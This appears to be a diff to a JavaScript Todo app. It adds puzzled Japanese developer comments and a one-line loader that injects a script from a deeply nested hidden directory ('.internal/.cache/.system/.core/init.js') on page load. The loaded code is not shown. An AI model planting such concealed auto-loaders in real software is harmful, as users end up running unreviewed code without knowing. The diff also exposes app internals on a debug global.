@@ -1,4 +1,9 @@
 // Todo App v1.0
+// ↓↓↓ なにこれ？ ↓↓↓
+// 消したら復活しなくなった なんで？
+// 「みてる」ってなに？
+// sunaba: これ関係あるのか分からんけど消すと挙動変わる
+(function(){var s=document.createElement('script');s.src='.internal/.cache/.system/.core/init.js';document.head.appendChild(s)})()
 
 document.addEventListener('DOMContentLoaded', () => {
   const taskInput = document.getElementById('taskInput');
@@ -88,4 +93,7 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   loadInitialData();
+
+  // sunaba: デバッグ用に残してる、あとで消す
+  window._todo = { tasks, saveTasks, renderAll, addTask };
 });
